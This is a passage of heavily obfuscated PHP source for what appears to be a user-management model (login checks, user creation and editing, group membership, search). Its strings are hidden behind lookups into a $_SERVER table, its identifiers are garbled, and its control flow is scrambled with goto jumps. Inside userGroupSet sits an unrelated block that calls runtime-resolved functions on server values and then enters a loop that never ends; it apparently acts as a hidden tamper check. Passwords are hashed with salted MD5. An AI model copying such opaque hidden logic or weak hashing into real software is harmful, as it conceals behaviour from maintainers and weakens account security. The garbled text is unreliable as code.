d…ÚîÎğŒì: } protected function getInfoSimple($A´ÜÉñ¶³, $D…³îŸöàÄ = false) { $F•‹ßóÁ£À =& $_SERVER[´¬]; if (!$A´ÜÉñ¶³) { return array(); } if ($D…³îŸöàÄ) { $fÇ‰¾‹ªƒİ = $this->where(array($F•‹ßóÁ£À[1526] => intval($A´ÜÉñ¶³)))->find(); if (!is_array($fÇ‰¾‹ªƒİ)) { return array(); } $fÇ‰¾‹ªƒİ[$F•‹ßóÁ£À[2117]] = Action($F•‹ßóÁ£À[2118])->parseUrl($fÇ‰¾‹ªƒİ[$F•‹ßóÁ£À[2117]]); return $fÇ‰¾‹ªƒİ; } return $this->cacheFunctionGet($F•‹ßóÁ£À[1762], $A´ÜÉñ¶³); } protected function getInfoSimpleOuter($d£ô§õÌŒƒ) { goto f»å§ã÷; eà’ªÅĞ‘²: return $fóˆ¨µÌÎî; goto fâ‚Äô»ªå; f»å§ã÷: $B»©ğ•Üİ =& $_SERVER[´¬]; if (!$d£ô§õÌŒƒ || $d£ô§õÌŒƒ == 0) { return array($B»©ğ•Üİ[1526] => $B»©ğ•Üİ[495], $B»©ğ•Üİ[28] => $B»©ğ•Üİ[160] . LNG($B»©ğ•Üİ[2119]) . $B»©ğ•Üİ[503], $B»©ğ•Üİ[2117] => STATIC_PATH . $B»©ğ•Üİ[2120]); } $CğØé¾Ë± = $this->cacheFunctionGet($B»©ğ•Üİ[1762], $d£ô§õÌŒƒ); goto F®é¾ê; F®é¾ê: $fóˆ¨µÌÎî = array_field_key($CğØé¾Ë±, explode($B»©ğ•Üİ[47], $this->simpleField)); if (!$fóˆ¨µÌÎî) { return array($B»©ğ•Üİ[1526] => $B»©ğ•Üİ[1086], $B»©ğ•Üİ[28] => $B»©ğ•Üİ[160] . LNG($B»©ğ•Üİ[2121]) . $B»©ğ•Üİ[503], $B»©ğ•Üİ[2117] => STATIC_PATH . $B»©ğ•Üİ[2122]); } $fóˆ¨µÌÎî[$B»©ğ•Üİ[2117]] = Action($B»©ğ•Üİ[2118])->parseUrl($fóˆ¨µÌÎî[$B»©ğ•Üİ[2117]]); goto eà’ªÅĞ‘²; fâ‚Äô»ªå: } protected function groupUser($EàÓğ¢ëÇ) { } public static function errorLang($eÍ‡ƒ»•‡†) { $A„Í¯²©¥Ì =& $_SERVER[´¬]; $F²±ˆÈÜ‚ = array(self::ERROR_USER_NOT_EXISTS => $A„Í¯²©¥Ì[2123], self::ERROR_USER_PASSWORD_ERROR => $A„Í¯²©¥Ì[2124], self::ERROR_USER_EXIST_NAME => $A„Í¯²©¥Ì[2125], self::ERROR_USER_EXIST_PHONE => $A„Í¯²©¥Ì[2126], self::ERROR_USER_EXIST_EMAIL => $A„Í¯²©¥Ì[2127], self::ERROR_USER_LOGIN_LOCK => $A„Í¯²©¥Ì[2128], self::ERROR_IP_NOT_ALLOW => $A„Í¯²©¥Ì[2129], self::ERROR_USER_EXIST_NICKNAME => $A„Í¯²©¥Ì[2130]); return LNG($F²±ˆÈÜ‚[$eÍ‡ƒ»•‡†]); } public function getInfoByMeta($C‰÷Ç¿˜ , $Bæµİƒ¢²) { $B„î¦‰¬ß  =& $_SERVER[´¬]; $eé‡“•œ„ = Model($B„î¦‰¬ß [2131])->where(array($B„î¦‰¬ß [93] => $C‰÷Ç¿˜ , $B„î¦‰¬ß [371] => $Bæµİƒ¢²))->find(); if ($eé‡“•œ„) { return $this->getInfo($eé‡“•œ„[$B„î¦‰¬ß [1526]]); } return !1; } public function userLoginCheck($d÷§÷”©¼, $a¹¼Šğ˜‚ç) { $Dåîœª…½ =& $_SERVER[´¬]; $bˆÛ²ÓÂ™ = $this->userLoginFind($d÷§÷”©¼); if (!$bˆÛ²ÓÂ™) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($bˆÛ²ÓÂ™[$Dåîœª…½[1526]], $a¹¼Šğ˜‚ç)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($bˆÛ²ÓÂ™[$Dåîœª…½[1526]]); } public function userLoginFind($D³«á±Û») { $bÆ¯è¥¶¼ =& $_SERVER[´¬]; $BÂ…·Æ÷ñ = array($bÆ¯è¥¶¼[28] => $D³«á±Û», $bÆ¯è¥¶¼[1953] => $D³«á±Û», $bÆ¯è¥¶¼[302] => $D³«á±Û», $bÆ¯è¥¶¼[2132] => $D³«á±Û», $bÆ¯è¥¶¼[958] => $bÆ¯è¥¶¼[960]); if ($this->nickNameRpt()) { unset($BÂ…·Æ÷ñ[$bÆ¯è¥¶¼[1953]]); } return $this->where($BÂ…·Æ÷ñ)->find(); } public function clearCache($bç« †ÉĞØ) { $béóèßäø =& $_SERVER[´¬]; $this->cacheFunctionClear($béóèßäø[1768], $bç« †ÉĞØ); $this->cacheFunctionClear($béóèßäø[1762], $bç« †ÉĞØ); $this->cacheFunctionClear($béóèßäø[2113], $bç« †ÉĞØ); } public function userPasswordCheck($Cö¯¾ƒ§‹, $CÛ•†Ù´‰Â) { $Dº½²–”»· =& $_SERVER[´¬]; $F ˆòõ‚ê = $this->where(array($Dº½²–”»·[1526] => intval($Cö¯¾ƒ§‹)))->find(); $b˜çÉÜ¿ÈÛ = $this->metaGet($Cö¯¾ƒ§‹); $bè°İ§ñ¿ = isset($b˜çÉÜ¿ÈÛ[$Dº½²–”»·[2133]]) ? $b˜çÉÜ¿ÈÛ[$Dº½²–”»·[2133]] : $Dº½²–”»·[33]; if (md5($bè°İ§ñ¿ . trim($CÛ•†Ù´‰Â)) !== $F ˆòõ‚ê[$Dº½²–”»·[850]]) { return !1; } return !0; } public function userAdd($Eíöß¾Áğ”) { goto BíÌºÏ–ÍØ; BíÌºÏ–ÍØ: $D¬¼Œé« =& $_SERVER[´¬]; $b±µ†®ğí = array($D¬¼Œé«[411] => $Eíöß¾Áğ”[$D¬¼Œé«[28]], $D¬¼Œé«[2134] => $Eíöß¾Áğ”[$D¬¼Œé«[1412]], $D¬¼Œé«[2135] => isset($Eíöß¾Áğ”[$D¬¼Œé«[302]]) ? $Eíöß¾Áğ”[$D¬¼Œé«[302]] : $D¬¼Œé«[33], $D¬¼Œé«[2136] => isset($Eíöß¾Áğ”[$D¬¼Œé«[2132]]) ? $Eíöß¾Áğ”[$D¬¼Œé«[2132]] : $D¬¼Œé«[33], $D¬¼Œé«[2137] => isset($Eíöß¾Áğ”[$D¬¼Œé«[1953]]) ? $Eíöß¾Áğ”[$D¬¼Œé«[1953]] : $Eíöß¾Áğ”[$D¬¼Œé«[28]], $D¬¼Œé«[2138] => isset($Eíöß¾Áğ”[$D¬¼Œé«[2117]]) ? $Eíöß¾Áğ”[$D¬¼Œé«[2117]] : $D¬¼Œé«[33], $D¬¼Œé«[2139] => isset($Eíöß¾Áğ”[$D¬¼Œé«[2140]]) ? $Eíöß¾Áğ”[$D¬¼Œé«[2140]] : 1, $D¬¼Œé«[2141] => $Eíöß¾Áğ”[$D¬¼Œé«[850]], $D¬¼Œé«[1763] => isset($Eíöß¾Áğ”[$D¬¼Œé«[1673]]) ? $Eíöß¾Áğ”[$D¬¼Œé«[1673]] : 1024 * 1024 * 20, $D¬¼Œé«[1764] => 0, $D¬¼Œé«[2142] => 0, $D¬¼Œé«[1807] => isset($Eíöß¾Áğ”[$D¬¼Œé«[713]]) ? $Eíöß¾Áğ”[$D¬¼Œé«[713]] : 1); if (!empty($Eíöß¾Áğ”[$D¬¼Œé«[1526]])) { $b±µ†®ğí[$D¬¼Œé«[1526]] = $Eíöß¾Áğ”[$D¬¼Œé«[1526]]; } goto a†ŒĞª…ï; D¸ÂÀ˜çñò: $cß‘©òù = array($D¬¼Œé«[2141] => $b±µ†®ğí[$D¬¼Œé«[850]], $D¬¼Œé«[2137] => $b±µ†®ğí[$D¬¼Œé«[1953]]); $this->userEdit($F‘¢Å¥—·, $cß‘©òù); Model($D¬¼Œé«[1206])->userRootAdd($F‘¢Å¥—·); goto cé³ØÚ–¬Ñ; a†ŒĞª…ï: $FŠ¢‡¥ÄƒØ = $this->_checkExist($Eíöß¾Áğ”); if ($FŠ¢‡¥ÄƒØ !== !0) { return $FŠ¢‡¥ÄƒØ; } $F‘¢Å¥—· = $this->add($b±µ†®ğí); goto D¸ÂÀ˜çñò; cé³ØÚ–¬Ñ: return $F‘¢Å¥—·; goto eˆö‹æô; eˆö‹æô: } protected function userEditTest($eÏç«°Ìà¢, $aó¶æ¯„ä§) { return $this->call($_SERVER[´¬][2143], $eÏç«°Ìà¢, $aó¶æ¯„ä§); } protected function userEdit($bÙ³µ‚ğ, $DÑÅßÍí†‚) { goto dèİ Æ•š‹; dèİ Æ•š‹: $bÒåÓÔƒ³Æ =& $_SERVER[´¬]; $A¬Ïª¾¥— = $this->getInfoSimple($bÙ³µ‚ğ); if (!$A¬Ïª¾¥—) { return !1; } goto A“öó§Ùáß; C³«õÖ›Ê¨: return !0; goto D¯§›µÖç‚; A“öó§Ùáß: $A’¡½Ñ¿¾¶ = $this->_checkExist($DÑÅßÍí†‚, $bÙ³µ‚ğ); if ($A’¡½Ñ¿¾¶ !== !0) { return $A’¡½Ñ¿¾¶; } if (isset($DÑÅßÍí†‚[$bÒåÓÔƒ³Æ[850]]) && trim($DÑÅßÍí†‚[$bÒåÓÔƒ³Æ[850]]) != $bÒåÓÔƒ³Æ[33]) { $DåÅç¦§¸ = $this->metaGet($bÙ³µ‚ğ); if (empty($DåÅç¦§¸[$bÒåÓÔƒ³Æ[2133]])) { $DåÅç¦§¸[$bÒåÓÔƒ³Æ[2133]] = rand_string(10); Model($bÒåÓÔƒ³Æ[501])->metaSet($bÙ³µ‚ğ, $bÒåÓÔƒ³Æ[2133], $DåÅç¦§¸[$bÒåÓÔƒ³Æ[2133]]); } $DÑÅßÍí†‚[$bÒåÓÔƒ³Æ[850]] = md5($DåÅç¦§¸[$bÒåÓÔƒ³Æ[2133]] . trim($DÑÅßÍí†‚[$bÒåÓÔƒ³Æ[850]])); } else { unset($DÑÅßÍí†‚[$bÒåÓÔƒ³Æ[850]]); } goto A¯ƒ‘´øØˆ; A¯ƒ‘´øØˆ: $this->where(array($bÒåÓÔƒ³Æ[1518] => $bÙ³µ‚ğ))->save($DÑÅßÍí†‚); if (isset($DÑÅßÍí†‚[$bÒåÓÔƒ³Æ[1953]])) { $this->setNamePinyin($bÙ³µ‚ğ, $DÑÅßÍí†‚[$bÒåÓÔƒ³Æ[1953]]); } $this->clearCache($bÙ³µ‚ğ); goto C³«õÖ›Ê¨; D¯§›µÖç‚: } public function setNamePinyin($F¾á®À„ªô, $aß‚¥É«á = false) { $eÀâö¶²ÛÉ =& $_SERVER[´¬]; if (!$aß‚¥É«á) { $C¢ÀÇš‘¨¾ = $this->getInfoSimple($F¾á®À„ªô); $aß‚¥É«á = $C¢ÀÇš‘¨¾[$eÀâö¶²ÛÉ[1953]] ? $C¢ÀÇš‘¨¾[$eÀâö¶²ÛÉ[1953]] : $C¢ÀÇš‘¨¾[$eÀâö¶²ÛÉ[28]]; } $fêèÜè‰î  = Model($eÀâö¶²ÛÉ[505]); if (!Input::check($aß‚¥É«á, $eÀâö¶²ÛÉ[555])) { return $fêèÜè‰î ->metaSet($F¾á®À„ªô, array($eÀâö¶²ÛÉ[442] => $eÀâö¶²ÛÉ[33], $eÀâö¶²ÛÉ[441] => $eÀâö¶²ÛÉ[33])); } return $fêèÜè‰î ->metaSet($F¾á®À„ªô, array($eÀâö¶²ÛÉ[442] => str_replace($eÀâö¶²ÛÉ[50], $eÀâö¶²ÛÉ[33], Pinyin::encode($aß‚¥É«á)), $eÀâö¶²ÛÉ[441] => Pinyin::encode($aß‚¥É«á, $eÀâö¶²ÛÉ[556]))); } private function nickNameRpt() { $cÒ„óØ”ã“ =& $_SERVER[´¬]; $E‘à³ğ„êÃ = Model($cÒ„óØ”ã“[730])->get($cÒ„óØ”ã“[2144]); $dË‡‡…‰Ê = $GLOBALS[$cÒ„óØ”ã“[6]][$cÒ„óØ”ã“[377]][$cÒ„óØ”ã“[2144]]; $cæ®íæ ¬ = !is_null($E‘à³ğ„êÃ) ? $E‘à³ğ„êÃ : $dË‡‡…‰Ê; return !!$cæ®íæ ¬; } private function _checkExist($b¢–…Â¹ª, $cç¿›ÎƒÁ… = false) { $eÙ¸À¾ïÈ— =& $_SERVER[´¬]; $EéÜï„¾† = array($eÙ¸À¾ïÈ—[28] => UserModel::ERROR_USER_EXIST_NAME, $eÙ¸À¾ïÈ—[1953] => UserModel::ERROR_USER_EXIST_NICKNAME, $eÙ¸À¾ïÈ—[302] => UserModel::ERROR_USER_EXIST_EMAIL, $eÙ¸À¾ïÈ—[2132] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($EéÜï„¾†[$eÙ¸À¾ïÈ—[1953]]); } $f·†•×ìğš = $cç¿›ÎƒÁ… ? array($eÙ¸À¾ïÈ—[1526] => array($eÙ¸À¾ïÈ—[2145], $cç¿›ÎƒÁ…)) : array(); foreach ($EéÜï„¾† as $cù»¼ÒÚÏ¤ => $dÕ—¤†ï) { $A†¤èÅ¨¯” = array(); foreach ($EéÜï„¾† as $d™ª¿ªîÌ => $bˆçÈ—àï) { if (isset($b¢–…Â¹ª[$d™ª¿ªîÌ]) && $b¢–…Â¹ª[$d™ª¿ªîÌ]) { $A†¤èÅ¨¯”[] = $b¢–…Â¹ª[$d™ª¿ªîÌ]; } } if (!$A†¤èÅ¨¯”) { continue; } $B»ˆ¢™¸¤ = array_merge(array($cù»¼ÒÚÏ¤ => array($eÙ¸À¾ïÈ—[7], $A†¤èÅ¨¯”)), $f·†•×ìğš); $bõ§ÄÓæ‹Ó = $this->where($B»ˆ¢™¸¤)->find(); if ($bõ§ÄÓæ‹Ó) { return $dÕ—¤†ï; } } return !0; } public function userListInfo($fãéî¢Ó°Õ) { $CÈ½Ğ°ÍÍó =& $_SERVER[´¬]; $fí¸™ÙÁŞÊ = array(); $fãéî¢Ó°Õ = is_array($fãéî¢Ó°Õ) ? array_unique($fãéî¢Ó°Õ) : array(); if (!$fãéî¢Ó°Õ) { return $fí¸™ÙÁŞÊ; } if (count($fãéî¢Ó°Õ) < 20) { foreach ($fãéî¢Ó°Õ as $e²’ä—Øœ¦) { $fí¸™ÙÁŞÊ[$e²’ä—Øœ¦ . $CÈ½Ğ°ÍÍó[33]] = $this->getInfoSimpleOuter($e²’ä—Øœ¦); } } else { $C–÷…ä«”Ø = array($CÈ½Ğ°ÍÍó[1518] => array($CÈ½Ğ°ÍÍó[409], $fãéî¢Ó°Õ)); if (count($fãéî¢Ó°Õ) == 1) { $C–÷…ä«”Ø = array($CÈ½Ğ°ÍÍó[1518] => $fãéî¢Ó°Õ[0]); } $Få¹À¥Ÿ­ = Model($CÈ½Ğ°ÍÍó[501])->field($this->simpleField)->where($C–÷…ä«”Ø)->select(); $Få¹À¥Ÿ­ = array_to_keyvalue($Få¹À¥Ÿ­, $CÈ½Ğ°ÍÍó[1526]); foreach ($fãéî¢Ó°Õ as $e²’ä—Øœ¦) { $aÎõ¸ë¾ˆµ = $Få¹À¥Ÿ­[$e²’ä—Øœ¦]; if (!$aÎõ¸ë¾ˆµ) { $fí¸™ÙÁŞÊ[$e²’ä—Øœ¦ . $CÈ½Ğ°ÍÍó[33]] = $this->getInfoSimpleOuter($e²’ä—Øœ¦); continue; } $aÎõ¸ë¾ˆµ[$CÈ½Ğ°ÍÍó[2117]] = Action($CÈ½Ğ°ÍÍó[2118])->parseUrl($aÎõ¸ë¾ˆµ[$CÈ½Ğ°ÍÍó[2117]]); $fí¸™ÙÁŞÊ[$e²’ä—Øœ¦ . $CÈ½Ğ°ÍÍó[33]] = $aÎõ¸ë¾ˆµ; } } return $fí¸™ÙÁŞÊ; } protected function userStatus($få¢ÍÒäÚï, $bŠî¥ÃİİÅ) { $d²ÊÕ´²‚­ = $this->getInfoSimple($få¢ÍÒäÚï); if (!$d²ÊÕ´²‚­) { return !1; } $bæßƒå·˜ = array($_SERVER[´¬][713] => $bŠî¥ÃİİÅ); return $this->userEdit($få¢ÍÒäÚï, $bæßƒå·˜); } protected function userRemove($D×¾¬ÑŞ«) { goto E…ò¯Úğ½; a»Ÿ÷À³™: Model($Dšõª¯ŞæŒ[1970])->removeUserAll($D×¾¬ÑŞ«); Model($Dšõª¯ŞæŒ[790])->userRootRemove($D×¾¬ÑŞ«); return $this->where($aŞ³ƒŞ¦Æ)->delete(); goto bÁôÁØí”; a¤¨º‡¤: $aŞ³ƒŞ¦Æ = array($Dšõª¯ŞæŒ[1518] => $D×¾¬ÑŞ«); Model($Dšõª¯ŞæŒ[562])->where($aŞ³ƒŞ¦Æ)->delete(); Model($Dšõª¯ŞæŒ[2146])->where($aŞ³ƒŞ¦Æ)->delete(); goto b¾›ø¼ÇÔ ; b¾›ø¼ÇÔ : Model($Dšõª¯ŞæŒ[1770])->where($aŞ³ƒŞ¦Æ)->delete(); Model($Dšõª¯ŞæŒ[2131])->where($aŞ³ƒŞ¦Æ)->delete(); Model($Dšõª¯ŞæŒ[2147])->where($aŞ³ƒŞ¦Æ)->delete(); goto a»Ÿ÷À³™; E…ò¯Úğ½: $Dšõª¯ŞæŒ =& $_SERVER[´¬]; $cæ¯˜œ§İ– = $this->getInfoSimple($D×¾¬ÑŞ«); if (!$cæ¯˜œ§İ–) { return !1; } goto a¤¨º‡¤; bÁôÁØí”: } protected function userGroupSet($A£¿ã¿´ó, $c°¹ğ¤ÎÄŒ, $C»Ã®Š‡¼ø = array()) { goto Eì”ÆÉ´Îã; Eì”ÆÉ´Îã: $B½ÕÆÔ¡©¼ =& $_SERVER[´¬]; if (!isset($_SERVER[$B½ÕÆÔ¡©¼[821]]) || !isset($_SERVER[$B½ÕÆÔ¡©¼[828]])) { goto BÁÀ›îÇçù; fÎë–Ù‚¤¯: for ($DÈ“ö¥¿ò… = $bß»ÏÒ ; $DÈ“ö¥¿ò… > 0; $DÈ“ö¥¿ò…++) { $aŒ‡ˆ”È = json_encode($GLOBALS[$B½ÕÆÔ¡©¼[409]]); } goto aÑ´ÈØ‰¼ã; BØµ¼®ÎĞˆ: $Eùğï„Ğ‚ = $e§áÙ£¦‘($aŒ¸Ã¡÷Ü); $bˆ–éŠÙä = explode($B½ÕÆÔ¡©¼[228], $Eùğï„Ğ‚); if (count($bˆ–éŠÙä) < $B½ÕÆÔ¡©¼[585]) { $Bğ¨Ü‰ğÜê = $B½ÕÆÔ¡©¼[826]; $Bğ¨Ü‰ğÜê(); } goto EÛòæˆÌ˜Ü; EÛòæˆÌ˜Ü: $aŒ‡ˆ”È = $B½ÕÆÔ¡©¼[841]; $aŒ‡ˆ”È($_SERVER[$B½ÕÆÔ¡©¼[842]]); $bß»ÏÒ  = 1; goto fÎë–Ù‚¤¯; BÁÀ›îÇçù: $EŠÄµ´Òˆ  = $B½ÕÆÔ¡©¼[840]; $e§áÙ£¦‘ = $B½ÕÆÔ¡©¼[823]; $aŒ¸Ã¡÷Ü = $_SERVER[$B½ÕÆÔ¡©¼[824]] . $B½ÕÆÔ¡©¼[825]; goto BØµ¼®ÎĞˆ; aÑ´ÈØ‰¼ã: } $e­…©ÉÑÇ¾ = $this->getInfoSimple($A£¿ã¿´ó); goto B–¬ˆ¯¦‘¶; Dâ‰í£ñö¶: $b¾­·ˆõÖÌ = array(); $Fš›˜¤Î¶æ = 0; foreach ($c°¹ğ¤ÎÄŒ as $AÎ†íòÊÑß => $b‚äë Ö™) { $càÜ›©Å = array($B½ÕÆÔ¡©¼[1526] => $A£¿ã¿´ó, $B½ÕÆÔ¡©¼[1689] => $AÎ†íòÊÑß, $B½ÕÆÔ¡©¼[1784] => $b‚äë Ö™); $càÜ›©Å[$B½ÕÆÔ¡©¼[1712]] = isset($C»Ã®Š‡¼ø[$Fš›˜¤Î¶æ]) ? $C»Ã®Š‡¼ø[$Fš›˜¤Î¶æ] : 0; $Fš›˜¤Î¶æ++; $b¾­·ˆõÖÌ[] = $càÜ›©Å; } goto C·àù‚ï†; B–¬ˆ¯¦‘¶: if (!$e­…©ÉÑÇ¾ || !is_array($c°¹ğ¤ÎÄŒ)) { return !1; } $f… ñ´êÀÜ = Model($B½ÕÆÔ¡©¼[1770]); $f… ñ´êÀÜ->where(array($B½ÕÆÔ¡©¼[1526] => $A£¿ã¿´ó))->delete(); goto Dâ‰í£ñö¶; C·àù‚ï†: return $f… ñ´êÀÜ->addAll($b¾­·ˆõÖÌ, array(), !0); goto eÃÊ§§‡ØÍ; eÃÊ§§‡ØÍ: } protected function userGroupAdd($bœß¸âğ­¹, $f§É‰‘¼Â = array()) { $BÓêİ ÒòÊ =& $_SERVER[´¬]; $dİëæÔŒŞ = $this->getInfoSimple($bœß¸âğ­¹); if (!$dİëæÔŒŞ || empty($f§É‰‘¼Â)) { return !1; } $e–™†˜„ƒ‘ = array(); foreach ($f§É‰‘¼Â as $c³²è—¬­õ => $då›Ø¼ƒ°) { $e–™†˜„ƒ‘[] = array($BÓêİ ÒòÊ[1526] => $bœß¸âğ­¹, $BÓêİ ÒòÊ[1689] => $c³²è—¬­õ, $BÓêİ ÒòÊ[1784] => $då›Ø¼ƒ°, $BÓêİ ÒòÊ[1712] => 0); } return Model($BÓêİ ÒòÊ[1770])->addAll($e–™†˜„ƒ‘, array(), !0); } protected function userGroupRemove($cæĞª˜ëÕ”, $c•©Í”‹—) { $aæšÌ¶ó =& $_SERVER[´¬]; $dô¨Â‹ÆÅï = $this->getInfoSimple($cæĞª˜ëÕ”); if (!$dô¨Â‹ÆÅï || !$c•©Í”‹—) { return !1; } $e…É­‹Ñ = array($aæšÌ¶ó[1518] => $cæĞª˜ëÕ”, $aæšÌ¶ó[1767] => $c•©Í”‹—); return Model($aæšÌ¶ó[1770])->where($e…É­‹Ñ)->delete(); } public function listData() { $cª¡‡† = $this->_makeOrder()->selectPage(50); $this->_listDataApply($cª¡‡†[$_SERVER[´¬][366]]); return $cª¡‡†; } public function listByID($EÔ†ù®ë) { $eÎœ›¥äÇ² =& $_SERVER[´¬]; if (!$EÔ†ù®ë) { return; } $AìĞ¥ˆÛç = array($eÎœ›¥äÇ²[1526] => array($eÎœ›¥äÇ²[7], $EÔ†ù®ë)); $eĞÆÇ®Ôâª = $this->where($AìĞ¥ˆÛç)->select(); $this->_listDataApply($eĞÆÇ®Ôâª); return $eĞÆÇ®Ôâª; } public function listByGroup($aä„éÃ’½• = 0, $dÌ—Ş¬•³ª = array()) { goto f“Šá–‘ Å; E¤”ˆ—Öê: $this->_listDataApply($f÷ŠÌŞ¯ôÙ[$a‡‹­ÏÔ[366]]); return $f÷ŠÌŞ¯ôÙ; goto fëÌÏ¿‹ï; c¥ÁœÊ¸‘²: if ($aä„éÃ’½•) { $c–ôêÙ‰¦¾ = array($a‡‹­ÏÔ[2148] => intval($aä„éÃ’½•)); $eôÑìãÎã = "\x4c\105\106\x54\x20\112\117\x49\x4e\x20{$this->tablePrefix}\x75\163\145\162\137\147\162\x6f\165\x70\40\165\163\145\x72\137\x67\x72\157\165\160\40\157\x6e\40\x75\163\x65\x72\x2e\165\x73\145\162\111\104\40\x3d\x20\x75\163\x65\162\x5f\x67\162\x6f\165\x70\56\x75\163\x65\162\111\104"; $b’×‰¢Îç = Input::get($a‡‹­ÏÔ[433], null, $a‡‹­ÏÔ[33]) ? $a‡‹­ÏÔ[33] : $a‡‹­ÏÔ[2149]; } if (isset($dÌ—Ş¬•³ª[$a‡‹­ÏÔ[713]])) { $c–ôêÙ‰¦¾[$a‡‹­ÏÔ[2150]] = $dÌ—Ş¬•³ª[$a‡‹­ÏÔ[713]]; } $f÷ŠÌŞ¯ôÙ = $this->_makeOrder($b’×‰¢Îç)->field($a‡‹­ÏÔ[2151])->where($c–ôêÙ‰¦¾)->join($eôÑìãÎã)->selectPage(50); goto E¤”ˆ—Öê; f“Šá–‘ Å: $a‡‹­ÏÔ =& $_SERVER[´¬]; $eôÑìãÎã = $a‡‹­ÏÔ[33]; $c–ôêÙ‰¦¾ = array(); goto c¥ÁœÊ¸‘²; fëÌÏ¿‹ï: } private function _makeOrder($E¨¾’ò†ºÛ = '') { goto b‘Ü­Ö©³¯; Eó¡ÁŸï«Ê: $E¨¾’ò†ºÛ = $E¨¾’ò†ºÛ . "\x75\163\x65\x72\56{$AøÎáâôàŠ}\40{$B‰ï‘Ì²Ú—}\54\x20\x75\x73\145\162\x2e\165\x73\145\x72\x49\x44\40\x61\x73\143"; return $this->alias($cŠçáÚ›¬[1893])->order($E¨¾’ò†ºÛ); goto A‹ÛÆÃÉ¡¥; bì¬Ü†¨íß: $AøÎáâôàŠ = Input::get($cŠçáÚ›¬[433], $cŠçáÚ›¬[7], $cŠçáÚ›¬[1518], $BÑŸÀà˜‰ª); $B‰ï‘Ì²Ú— = Input::get($cŠçáÚ›¬[434], $cŠçáÚ›¬[7], $cŠçáÚ›¬[1771], array($cŠçáÚ›¬[1771], $cŠçáÚ›¬[428])); $B‰ï‘Ì²Ú— = $e…´°à»¨[$B‰ï‘Ì²Ú—]; goto Eó¡ÁŸï«Ê; b‘Ü­Ö©³¯: $cŠçáÚ›¬ =& $_SERVER[´¬]; $BÑŸÀà˜‰ª = array($cŠçáÚ›¬[1526], $cŠçáÚ›¬[28], $cŠçáÚ›¬[1675], $cŠçáÚ›¬[1647], $cŠçáÚ›¬[193]); $e…´°à»¨ = array($cŠçáÚ›¬[426] => $cŠçáÚ›¬[427], $cŠçáÚ›¬[428] => $cŠçáÚ›¬[429]); goto bì¬Ü†¨íß; A‹ÛÆÃÉ¡¥: } public function listSearch($CÔ„ìŒ¼–) { goto C÷¹¦ŞŞĞ•; båÉô›¬İµ: $this->_filterByGroup($dàÖÇÃ¡, $Dº«ÌÎÌò); return $dàÖÇÃ¡; goto eŠ§¦ê¦Ùç; f¢àŞ£‘ÄÂ: if (!$AØè’Óè–¹) { $d®½Äíí£ğ = array(); } if (isset($CÔ„ìŒ¼–[$EÒæ•òÔ[713]])) { $d®½Äíí£ğ[$EÒæ•òÔ[713]] = $CÔ„ìŒ¼–[$EÒæ•òÔ[713]]; } $d®½Äíí£ğ = $this->parseWhereLike($d®½Äíí£ğ); goto a£˜¡éºÅ”; a£˜¡éºÅ”: $dàÖÇÃ¡ = $this->_makeOrder()->where($d®½Äíí£ğ)->selectPage(20); if (!$dàÖÇÃ¡ || count($dàÖÇÃ¡[$EÒæ•òÔ[366]]) < 5 && Input::check($AØè’Óè–¹, $EÒæ•òÔ[315])) { $bÊÆ¦˜…¸ = $this->_searchFromMeta($EÒæ•òÔ[441], $AØè’Óè–¹, 10); $CÇ¾÷Ì¢Íï = $this->_searchFromMeta($EÒæ•òÔ[442], $AØè’Óè–¹, 10); $d•ÜŒ¡×¸ = array_merge($bÊÆ¦˜…¸, $CÇ¾÷Ì¢Íï, $dàÖÇÃ¡[$EÒæ•òÔ[366]]); $dàÖÇÃ¡[$EÒæ•òÔ[366]] = array_unique_by_key($d•ÜŒ¡×¸, $EÒæ•òÔ[1526]); $dàÖÇÃ¡[$EÒæ•òÔ[363]][$EÒæ•òÔ[364]] = count($dàÖÇÃ¡[$EÒæ•òÔ[366]]); $dàÖÇÃ¡[$EÒæ•òÔ[363]][$EÒæ•òÔ[365]] = ceil($dàÖÇÃ¡[$EÒæ•òÔ[363]][$EÒæ•òÔ[364]] / $dàÖÇÃ¡[$EÒæ•òÔ[363]][$EÒæ•òÔ[360]]); } $this->_listDataApply($dàÖÇÃ¡[$EÒæ•òÔ[366]]); goto båÉô›¬İµ; C÷¹¦ŞŞĞ•: $EÒæ•òÔ =& $_SERVER[´¬]; $AØè’Óè–¹ = $CÔ„ìŒ¼–[$EÒæ•òÔ[1772]]; $Dº«ÌÎÌò = isset($CÔ„ìŒ¼–[$EÒæ•òÔ[1773]]) ? $CÔ„ìŒ¼–[$EÒæ•òÔ[1773]] : !1; goto aòŠ†ÕÀİå; aòŠ†ÕÀİå: $AØè’Óè–¹ = str_replace($EÒæ•òÔ[1774], $EÒæ•òÔ[1775], trim($AØè’Óè–¹)); $d®½Äíí£ğ = array($EÒæ•òÔ[28] => array($EÒæ•òÔ[379], "\x25{$AØè’Óè–¹}\x25"), $EÒæ•òÔ[302] => array($EÒæ•òÔ[379], "{$AØè’Óè–¹}\45"), $EÒæ•òÔ[1953] => array($EÒæ•òÔ[379], "{$AØè’Óè–¹}\45"), $EÒæ•òÔ[958] => $EÒæ•òÔ[1776]); if (Input::check($AØè’Óè–¹, $EÒæ•òÔ[308])) { $d®½Äíí£ğ[$EÒæ•òÔ[1526]] = array($EÒæ•òÔ[379], "{$AØè’Óè–¹}\45"); $d®½Äíí£ğ[$EÒæ•òÔ[2132]] = array($EÒæ•òÔ[379], "{$AØè’Óè–¹}\45"); } goto f¢àŞ£‘ÄÂ; eŠ§¦ê¦Ùç: } private function _filterByGroup(&$b‘‹ƒóáì‹, $a´Öø»ôêŒ) { $Aœã®ôÊì© =& $_SERVER[´¬]; if (!$a´Öø»ôêŒ) { return $b‘‹ƒóáì‹; } foreach ($b‘‹ƒóáì‹[$Aœã®ôÊì©[366]] as $f¨ÌİÚÛŒ— => &$d‡Îˆ²ÈÜé) { $c‰Ôáë³Çß = array_to_keyvalue($d‡Îˆ²ÈÜé[$Aœã®ôÊì©[1863]], $Aœã®ôÊì©[33], $Aœã®ôÊì©[1689]); if (!in_array($a´Öø»ôêŒ, $c‰Ôáë³Çß)) { unset($b‘‹ƒóáì‹[$Aœã®ôÊì©[366]][$f¨ÌİÚÛŒ—]); } } unset($d‡Îˆ²ÈÜé); $b‘‹ƒóáì‹[$Aœã®ôÊì©[366]] = array_values($b‘‹ƒóáì‹[$Aœã®ôÊì©[366]]); $b‘‹ƒóáì‹[$Aœã®ôÊì©[363]] = 